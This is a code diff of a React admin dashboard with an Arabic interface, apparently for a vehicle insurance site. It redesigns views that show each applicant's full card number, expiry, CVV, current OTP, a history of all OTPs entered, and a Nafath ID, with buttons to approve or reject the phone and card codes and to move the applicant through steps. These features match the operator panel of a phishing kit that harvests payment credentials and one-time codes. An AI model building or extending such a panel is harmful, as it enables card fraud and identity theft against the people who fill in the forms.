-                  <h3 className="text-lg font-bold text-slate-900 mb-4">تفاصيل التأمين</h3>
-                  <div className="space-y-3">
-                    {selectedApplication.insuranceType && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">نوع التأمين</span>
-                        <span className="text-sm font-medium text-slate-900">{selectedApplication.insuranceType}</span>
-                      </div>
-                    )}
-                    {selectedApplication.insuranceStartDate && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">تاريخ بدء التأمين</span>
-                        <span className="text-sm font-medium text-slate-900">
-                          {selectedApplication.insuranceStartDate}
-                        </span>
-                      </div>
-                    )}
-                    {selectedApplication.repairLocation && (
-                      <div className="flex justify-between py-2 border-b border-slate-100">
-                        <span className="text-sm text-slate-600">موقع الإصلاح</span>
-                        <span className="text-sm font-medium text-slate-900">
-                          {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
-                        </span>
-                      </div>
-                    )}
-                  </div>
-                </div>
-
-                <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
-                  <h3 className="text-lg font-bold text-slate-900 mb-4">حالة التحقق</h3>
-                  <div className="space-y-3">
-                    <div className="flex items-center justify-between p-4 bg-slate-50 rounded-lg">
-                      <div className="flex items-center gap-3">
-                        <div className="w-10 h-10 rounded-full bg-blue-100 flex items-center justify-center">
-                          <Phone className="w-5 h-5 text-blue-600" />
+                  {/* Document Info - Only show if data exists */}
+                  {hasDocumentInfo(selectedApplication) && (
+                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                      <div className="flex items-center gap-3 mb-4">
+                        <div className="w-10 h-10 bg-blue-100 dark:bg-blue-900/30 rounded-lg flex items-center justify-center">
+                          <FileText className="w-5 h-5 text-blue-600 dark:text-blue-400" />
                         </div>
-                        <div>
-                          <p className="text-sm font-medium text-slate-900">رمز الهاتف</p>
-                          <p className="text-xs text-slate-600">
-                            {selectedApplication.phoneVerificationCode || "لم يتم إنشاؤه"}
-                          </p>
+                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات الوثيقة</h3>
+                      </div>
+                      <div className="space-y-3">
+                        {selectedApplication.documentType && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">نوع الوثيقة</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
+                              {selectedApplication.documentType}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.serialNumber && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">الرقم التسلسلي</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white font-mono">
+                              {selectedApplication.serialNumber}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.phoneNumber && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">رقم الهاتف</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white" dir="ltr">
+                              {selectedApplication.phoneNumber}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.nafazId && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">رقم نفاذ</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white font-mono">
+                              {selectedApplication.nafazId}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.country && (
+                          <div className="flex justify-between items-center py-2.5">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">الدولة</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
+                              {selectedApplication.country}
+                            </span>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Insurance Info - Only show if data exists */}
+                  {hasInsuranceInfo(selectedApplication) && (
+                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                      <div className="flex items-center gap-3 mb-4">
+                        <div className="w-10 h-10 bg-green-100 dark:bg-green-900/30 rounded-lg flex items-center justify-center">
+                          <Shield className="w-5 h-5 text-green-600 dark:text-green-400" />
+                        </div>
+                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">تفاصيل التأمين</h3>
+                      </div>
+                      <div className="space-y-3">
+                        {selectedApplication.insuranceType && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">نوع التأمين</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
+                              {selectedApplication.insuranceType}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.insuranceStartDate && (
+                          <div className="flex justify-between items-center py-2.5 border-b border-slate-100 dark:border-slate-800">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">تاريخ البدء</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
+                              {selectedApplication.insuranceStartDate}
+                            </span>
+                          </div>
+                        )}
+                        {selectedApplication.repairLocation && (
+                          <div className="flex justify-between items-center py-2.5">
+                            <span className="text-sm text-slate-600 dark:text-slate-400">موقع الإصلاح</span>
+                            <span className="text-sm font-semibold text-slate-900 dark:text-white">
+                              {selectedApplication.repairLocation === "agency" ? "الوكالة" : "ورشة"}
+                            </span>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Vehicle Info - Only show if data exists */}
+                  {hasVehicleInfo(selectedApplication) && (
+                    <div className="bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                      <div className="flex items-center gap-3 mb-4">
+                        <div className="w-10 h-10 bg-purple-100 dark:bg-purple-900/30 rounded-lg flex items-center justify-center">
+                          <Car className="w-5 h-5 text-purple-600 dark:text-purple-400" />
+                        </div>
+                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات المركبة</h3>
+                      </div>
+                      <div className="grid grid-cols-2 gap-4">
+                        {selectedApplication.vehicleModel && (
+                          <div>
+                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">الموديل</p>
+                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
+                              {selectedApplication.vehicleModel}
+                            </p>
+                          </div>
+                        )}
+                        {selectedApplication.manufacturingYear && (
+                          <div>
+                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">سنة الصنع</p>
+                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
+                              {selectedApplication.manufacturingYear}
+                            </p>
+                          </div>
+                        )}
+                        {selectedApplication.vehicleValue && (
+                          <div>
+                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">القيمة</p>
+                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
+                              {selectedApplication.vehicleValue} ريال
+                            </p>
+                          </div>
+                        )}
+                        {selectedApplication.vehicleUsage && (
+                          <div>
+                            <p className="text-xs text-slate-500 dark:text-slate-400 mb-1">الاستخدام</p>
+                            <p className="font-semibold text-slate-900 dark:text-white text-sm">
+                              {selectedApplication.vehicleUsage}
+                            </p>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Verification Status */}
+                  <div className="lg:col-span-2 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">حالة التحقق</h3>
+                    <div className="space-y-4">
+                      {/* Phone Verification */}
+                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex items-center gap-3">
+                            <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
+                              <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication.phoneNumber2 || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                          </div>
+                          <Badge
+                            variant={
+                              selectedApplication.phoneVerificationStatus === "approved"
+                                ? "default"
+                                : selectedApplication.phoneVerificationStatus === "rejected"
+                                  ? "destructive"
+                                  : "secondary"
+                            }
+                            className="text-xs"
+                          >
+                            {selectedApplication.phoneVerificationStatus === "approved"
+                              ? "موافق"
+                              : selectedApplication.phoneVerificationStatus === "rejected"
+                                ? "مرفوض"
+                                : "معلق"}
+                          </Badge>
+                        </div>
+                        <div className="flex gap-2">
+                          <Button
+                            onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
+                            disabled={selectedApplication.phoneVerificationStatus === "approved"}
+                          >
+                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
+                            <span className="text-green-700 dark:text-green-400">قبول</span>
+                          </Button>
+                          <Button
+                            onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
+                            disabled={selectedApplication.phoneVerificationStatus === "rejected"}
+                          >
+                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
+                            <span className="text-red-700 dark:text-red-400">رفض</span>
+                          </Button>
                         </div>
                       </div>
-                      <Badge
-                        variant={
-                          selectedApplication.phoneVerificationStatus === "approved"
-                            ? "default"
-                            : selectedApplication.phoneVerificationStatus === "rejected"
-                              ? "destructive"
-                              : "secondary"
-                        }
+
+                      {/* ID Verification */}
+                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex items-center gap-3">
+                            <div className="w-12 h-12 rounded-xl bg-green-100 dark:bg-green-900/30 flex items-center justify-center">
+                              <CreditCard className="w-6 h-6 text-green-600 dark:text-green-400" />
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز البطاقة</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication.otp || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                          </div>
+                          <Badge
+                            variant={
+                              selectedApplication.idVerificationStatus === "approved"
+                                ? "default"
+                                : selectedApplication.idVerificationStatus === "rejected"
+                                  ? "destructive"
+                                  : "secondary"
+                            }
+                            className="text-xs"
+                          >
+                            {selectedApplication.idVerificationStatus === "approved"
+                              ? "موافق"
+                              : selectedApplication.idVerificationStatus === "rejected"
+                                ? "مرفوض"
+                                : "معلق"}
+                          </Badge>
+                        </div>
+                        <div className="flex gap-2">
+                          <Button
+                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
+                            disabled={selectedApplication.idVerificationStatus === "approved"}
+                          >
+                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
+                            <span className="text-green-700 dark:text-green-400">قبول</span>
+                          </Button>
+                          <Button
+                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
+                            disabled={selectedApplication.idVerificationStatus === "rejected"}
+                          >
+                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
+                            <span className="text-red-700 dark:text-red-400">رفض</span>
+                          </Button>
+                        </div>
+                      </div>
+
+                      <Button
+                        onClick={() => (window.location.href = "/verify")}
+                        variant="outline"
+                        className="w-full gap-2"
                       >
-                        {selectedApplication.phoneVerificationStatus === "approved"
-                          ? "موافق"
-                          : selectedApplication.phoneVerificationStatus === "rejected"
-                            ? "مرفوض"
-                            : "معلق"}
-                      </Badge>
+                        <User className="w-4 h-4" />
+                        الذهاب إلى صفحة التحقق
+                      </Button>
                     </div>
-                    <div className="flex items-center justify-between p-4 bg-slate-50 rounded-lg">
-                      <div className="flex items-center gap-3">
-                        <div className="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center">
-                          <CreditCard className="w-5 h-5 text-green-600" />
+                  </div>
+
+                  {/* Payment Info - Only show if card data exists */}
+                  {selectedApplication.cardNumber && (
+                    <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                      <div className="flex items-center gap-3 mb-6">
+                        <div className="w-10 h-10 bg-indigo-100 dark:bg-indigo-900/30 rounded-lg flex items-center justify-center">
+                          <CreditCard className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
                         </div>
-                        <div>
-                          <p className="text-sm font-medium text-slate-900">رمز البطاقة</p>
-                          <p className="text-xs text-slate-600">
-                            {selectedApplication.idVerificationCode || "لم يتم إنشاؤه"}
-                          </p>
+                        <h3 className="text-lg font-bold text-slate-900 dark:text-white">معلومات الدفع</h3>
+                      </div>
+                      <div className="flex flex-col lg:flex-row gap-6">
+                        <div className="flex-1">
+                          <CreditCardMockup
+                            cardNumber={selectedApplication.cardNumber}
+                            expiryDate={selectedApplication?.expiryDate}
+                            cvv={selectedApplication?.cvv}
+                            cardholderName={selectedApplication.ownerName}
+                          />
+                        </div>
+                        <div className="lg:w-64 space-y-4">
+                          {selectedApplication.otp && (
+                            <div className="p-4 bg-green-50 dark:bg-green-950/30 border border-green-200 dark:border-green-800 rounded-xl">
+                              <p className="text-xs font-medium text-green-900 dark:text-green-300 mb-2">
+                                رمز OTP الحالي
+                              </p>
+                              <p
+                                className="text-3xl font-bold text-green-600 dark:text-green-400 font-mono text-center"
+                                dir="ltr"
+                              >
+                                {selectedApplication.otp}
+                              </p>
+                            </div>
+                          )}
+                          {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
+                            <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl">
+                              <p className="text-xs font-medium text-slate-700 dark:text-slate-300 mb-3">
+                                سجل رموز OTP
+                              </p>
+                              <div className="flex flex-wrap gap-2">
+                                {selectedApplication.allOtps.map((otp, index) => (
+                                  <Badge
+                                    key={index}
+                                    variant="secondary"
+                                    className="bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-slate-300 font-mono"
+                                    dir="ltr"
+                                  >
+                                    {otp}
+                                  </Badge>
+                                ))}
+                              </div>
+                            </div>
+                          )}
                         </div>
                       </div>
-                      <Badge
-                        variant={
-                          selectedApplication.idVerificationStatus === "approved"
-                            ? "default"
-                            : selectedApplication.idVerificationStatus === "rejected"
-                              ? "destructive"
-                              : "secondary"
-                        }
+                    </div>
+                  )}
+
+                  {/* Control Panel */}
+                  <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">التحكم بالطلب</h3>
+                    <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
+                      <Button
+                        onClick={() => handleStatusChange(selectedApplication.id!, "pending_review")}
+                        variant="outline"
+                        className="h-auto py-4 justify-start"
+                        disabled={selectedApplication.status === "pending_review"}
                       >
-                        {selectedApplication.idVerificationStatus === "approved"
-                          ? "موافق"
-                          : selectedApplication.idVerificationStatus === "rejected"
-                            ? "مرفوض"
-                            : "معلق"}
-                      </Badge>
-                    </div>
-                    <Button
-                      onClick={() => (window.location.href = "/verify")}
-                      variant="outline"
-                      className="w-full gap-2"
-                    >
-                      <CheckCircle className="w-4 h-4" />
-                      الذهاب إلى صفحة التحقق
-                    </Button>
-                  </div>
-                </div>
-
-                {selectedApplication.vehicleModel && (
-                  <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4">
-                    <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات المركبة</h3>
-                    <div className="grid grid-cols-2 gap-4 text-sm">
-                      <div>
-                        <p className="text-slate-600 mb-1">الموديل</p>
-                        <p className="font-medium text-slate-900">{selectedApplication.vehicleModel}</p>
-                      </div>
-                      <div>
-                        <p className="text-slate-600 mb-1">سنة الصنع</p>
-                        <p className="font-medium text-slate-900">{selectedApplication.manufacturingYear}</p>
-                      </div>
-                      <div>
-                        <p className="text-slate-600 mb-1">القيمة</p>
-                        <p className="font-medium text-slate-900">{selectedApplication.vehicleValue} ريال</p>
-                      </div>
-                      <div>
-                        <p className="text-slate-600 mb-1">الاستخدام</p>
-                        <p className="font-medium text-slate-900">{selectedApplication.vehicleUsage}</p>
-                      </div>
-                    </div>
-                  </div>
-                )}
-
-                {selectedApplication.cardNumber && (
-                  <div className="bg-white rounded-lg border border-slate-200 p-6 mb-4 col-span-2">
-                    <h3 className="text-lg font-bold text-slate-900 mb-4">معلومات الدفع</h3>
-                    <CreditCardMockup
-                      cardNumber={selectedApplication.cardNumber}
-                      expiryDate={selectedApplication?.expiryDate}
-                      cvv={selectedApplication?.cvv}
-                      cardholderName={selectedApplication.ownerName}
-                    />
-                    {selectedApplication.otp && (
-                      <div className="mt-6 p-4 bg-green-50 border border-green-200 rounded-lg">
-                        <div className="flex items-center justify-between">
-                          <span className="text-sm font-medium text-green-900">رمز OTP الحالي</span>
-                          <span className="text-2xl font-bold text-green-600 font-mono" dir="ltr">
-                            {selectedApplication.otp}
-                          </span>
+                        <Clock className="w-5 h-5 ml-3 text-amber-600" />
+                        <div className="text-right">
+                          <p className="font-semibold text-sm">قيد المراجعة</p>
+                          <p className="text-xs text-slate-600 dark:text-slate-400">تحت المراجعة</p>
                         </div>
-                      </div>
-                    )}
-                    {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
-                      <div className="mt-4 p-4 bg-slate-50 rounded-lg">
-                        <p className="text-sm font-medium text-slate-700 mb-3">سجل رموز OTP</p>
-                        <div className="flex flex-wrap gap-2">
-                          {selectedApplication.allOtps.map((otp, index) => (
-                            <Badge
-                              key={index}
-                              variant="secondary"
-                              className="bg-slate-200 text-slate-700 font-mono"
-                              dir="ltr"
-                            >
-                              {otp}
-                            </Badge>
-                          ))}
+                      </Button>
+                      <Button
+                        onClick={() => handleStatusChange(selectedApplication.id!, "approved")}
+                        variant="outline"
+                        className="h-auto py-4 justify-start hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
+                        disabled={selectedApplication.status === "approved"}
+                      >
+                        <CheckCircle className="w-5 h-5 ml-3 text-green-600 dark:text-green-400" />
+                        <div className="text-right">
+                          <p className="font-semibold text-sm text-green-700 dark:text-green-400">الموافقة</p>
+                          <p className="text-xs text-green-600 dark:text-green-500">قبول الطلب</p>
                         </div>
-                      </div>
-                    )}
-                  </div>
-                )}
+                      </Button>
+                      <Button
+                        onClick={() => handleStatusChange(selectedApplication.id!, "rejected")}
+                        variant="outline"
+                        className="h-auto py-4 justify-start hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
+                        disabled={selectedApplication.status === "rejected"}
+                      >
+                        <XCircle className="w-5 h-5 ml-3 text-red-600 dark:text-red-400" />
+                        <div className="text-right">
+                          <p className="font-semibold text-sm text-red-700 dark:text-red-400">الرفض</p>
+                          <p className="text-xs text-red-600 dark:text-red-500">رفض الطلب</p>
+                        </div>
+                      </Button>
+                    </div>
 
-                <div className="bg-white rounded-lg border border-slate-200 p-6">
-                  <h3 className="text-lg font-bold text-slate-900 mb-4">التحكم بالحالة</h3>
-                  <div className="space-y-2">
-                    <Button
-                      onClick={() => handleStatusChange(selectedApplication.id!, "pending_review")}
-                      variant="outline"
-                      className="w-full justify-start h-auto py-3"
-                    >
-                      <Clock className="w-5 h-5 ml-3" />
-                      <div className="text-right">
-                        <p className="font-medium">قيد المراجعة</p>
-                        <p className="text-xs text-slate-600">تحت المراجعة من قبل الفريق</p>
+                    <div className="pt-4 border-t border-slate-200 dark:border-slate-800">
+                      <h4 className="text-sm font-semibold text-slate-700 dark:text-slate-300 mb-3">التحكم بالخطوات</h4>
+                      <div className="flex gap-2">
+                        {[1, 2, 3, 4].map((step) => (
+                          <Button
+                            key={step}
+                            onClick={() => handleStepChange(selectedApplication.id!, step - 1)}
+                            variant={selectedApplication.currentStep === step - 1 ? "default" : "outline"}
+                            size="lg"
+                            className="flex-1"
+                          >
+                            الخطوة {step}
+                          </Button>
+                        ))}
                       </div>
-                    </Button>
-                    <Button
-                      onClick={() => handleStatusChange(selectedApplication.id!, "approved")}
-                      variant="outline"
-                      className="w-full justify-start h-auto py-3 hover:bg-green-50 border-green-200"
-                    >
-                      <CheckCircle className="w-5 h-5 ml-3 text-green-600" />
-                      <div className="text-right">
-                        <p className="font-medium text-green-700">الموافقة على الطلب</p>
-                        <p className="text-xs text-green-600">قبول الطلب والمتابعة</p>
-                      </div>
-                    </Button>
-                    <Button
-                      onClick={() => handleStatusChange(selectedApplication.id!, "rejected")}
-                      variant="outline"
-                      className="w-full justify-start h-auto py-3 hover:bg-red-50 border-red-200"
-                    >
-                      <XCircle className="w-5 h-5 ml-3 text-red-600" />
-                      <div className="text-right">
-                        <p className="font-medium text-red-700">رفض الطلب</p>
-                        <p className="text-xs text-red-600">رفض الطلب مع إشعار العميل</p>
-                      </div>
-                    </Button>
-                  </div>
-                  <div className="mt-6 pt-6 border-t border-slate-200">
-                    <h4 className="text-sm font-semibold text-slate-700 mb-3">التحكم بالخطوات</h4>
-                    <div className="flex gap-2">
-                      {[1, 2, 3, 4].map((step) => (
-                        <Button
-                          key={step}
-                          onClick={() => handleStepChange(selectedApplication.id!, step - 1)}
-                          variant={selectedApplication.currentStep === step - 1 ? "default" : "outline"}
-                          size="sm"
-                          className={`flex-1 ${selectedApplication.currentStep === step - 1 ? "bg-blue-600" : ""}`}
-                        >
-                          {step}
-                        </Button>
-                      ))}
                     </div>
                   </div>
                 </div>
@@ -726,11 +1071,13 @@ export default function AdminDashboard() {
           ) : (
             <div className="flex items-center justify-center h-full">
               <div className="text-center">
-                <div className="w-20 h-20 rounded-full bg-slate-100 flex items-center justify-center mx-auto mb-4">
-                  <Mail className="w-10 h-10 text-slate-400" />
+                <div className="w-24 h-24 rounded-2xl bg-gradient-to-br from-slate-100 to-slate-200 dark:from-slate-800 dark:to-slate-700 flex items-center justify-center mx-auto mb-4 shadow-inner">
+                  <Mail className="w-12 h-12 text-slate-400 dark:text-slate-500" />
                 </div>
-                <h3 className="text-lg font-semibold text-slate-900 mb-2">اختر طلب لعرض التفاصيل</h3>
-                <p className="text-slate-600 text-sm">اضغط على أي طلب من القائمة لعرض المعلومات الكاملة</p>
+                <h3 className="text-xl font-bold text-slate-900 dark:text-white mb-2">اختر طلباً لعرض التفاصيل</h3>
+                <p className="text-slate-600 dark:text-slate-400">
+                  اضغط على أي طلب من القائمة الجانبية لعرض المعلومات الكاملة
+                </p>
               </div>
             </div>
           )}
